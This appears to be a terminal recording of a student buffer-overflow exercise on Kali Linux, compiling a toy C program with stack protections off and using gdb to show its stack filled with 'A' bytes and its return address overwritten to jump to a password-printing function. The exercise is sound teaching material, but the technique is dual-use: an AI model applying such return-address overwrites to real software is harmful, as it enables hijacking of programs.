@@ -1,0 +1,103 @@
+Script started on 2021-05-31 05:49:44+00:00
+]0;root@kali: ~[01;31mroot@kali[00m:[01;34m~[00m# gcc -g -z execstack -no-pie -o bo bo.c
+]0;root@kali: ~[01;31mroot@kali[00m:[01;34m~[00m# ./bo < input
+Fail..
+My password is Success!!!
+Segmentation fault
+]0;root@kali: ~[01;31mroot@kali[00m:[01;34m~[00m# gdb bo
+GNU gdb (Debian 8.1-4+b1) 8.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from bo...done.
+(gdb) list [K
+7	}
+8	
+9	int func2(){
+10		printf("My password is Success!!!\n");
+11		return 1;
+12	}
+13	
+14	void main1(){
+15		char buffer[MY_SHA3_HASH_LAST_TWO_DIGIT_NUMBER];
+16		scanf("%s", buffer);
+(gdb) 
+17		func1();
+18	}
+19	
+20	void main(){
+21		main1();
+22	}
+(gdb) break 16
+Breakpoint 1 at 0x8049201: file bo.c, line 16.
+(gdb) run < input
+Starting program: /root/bo < input
+
+Breakpoint 1, main1 () at bo.c:16
+16		scanf("%s", buffer);
+(gdb) x/40x $esp
+0xbffff320:	0x00000000	0x00c30000	0x00000000	0xb7fff000
+0xbffff330:	0x00000000	0x00000000	0x00000000	0xec44d900
+0xbffff340:	0x0000000b	0xbffff5b7	0xb7e07d09	0xb7fb0808
+0xbffff350:	0xb7fad000	0xb7fad000	0x00000000	0xb7e07e6b
+0xbffff360:	0xb7fad3fc	0x00000000	0x00000000	0x0804928b
+0xbffff370:	0x00000001	0xbffff434	0xbffff43c	0x08049261
+0xbffff380:	0xb7fe6f60	0x00000000	0xbffff398	0x08049239
+0xbffff390:	0xb7fad000	0xb7fad000	0x00000000	0xb7df09a1
+0xbffff3a0:	0x00000001	0xbffff434	0xbffff43c	0xbffff3c4
+0xbffff3b0:	0x00000001	0x00000000	0xb7fad000	0xb7fe6d0a
+(gdb) next
+17		func1();
+(gdb) nextx/40x $esp
+0xbffff320:	0x00000000	0x41414141	0x41414141	0x41414141
+0xbffff330:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff340:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff350:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff360:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff370:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff380:	0x41414141	0x41414141	0x42424242	0x080491c1
+0xbffff390:	0xb7fad000	0xb7fad000	0x00000000	0xb7df09a1
+0xbffff3a0:	0x00000001	0xbffff434	0xbffff43c	0xbffff3c4
+0xbffff3b0:	0x00000001	0x00000000	0xb7fad000	0xb7fe6d0a
+(gdb) next
+Fail..
+18	}
+(gdb) next
+func2 () at bo.c:9
+9	int func2(){
+(gdb) next
+10		printf("My password is Success!!!\n");
+(gdb) next
+My password is Success!!!
+11		return 1;
+(gdb) next
+12	}
+(gdb) next
+0xb7fad000 in _GLOBAL_OFFSET_TABLE_ () from /lib/i386-linux-gnu/libc.so.6
+(gdb) next
+Single stepping until exit from function _GLOBAL_OFFSET_TABLE_,
+which has no line number information.
+
+Program received signal SIGSEGV, Segmentation fault.
+0xb7fad000 in _GLOBAL_OFFSET_TABLE_ () from /lib/i386-linux-gnu/libc.so.6
+(gdb) next
+Single stepping until exit from function _GLOBAL_OFFSET_TABLE_,
+which has no line number information.
+
+Program terminated with signal SIGSEGV, Segmentation fault.
+The program no longer exists.
+(gdb) next[K[K[K[Kquit
+]0;root@kali: ~[01;31mroot@kali[00m:[01;34m~[00m# exit
+exit
+
+Script done on 2021-05-31 05:52:22+00:00
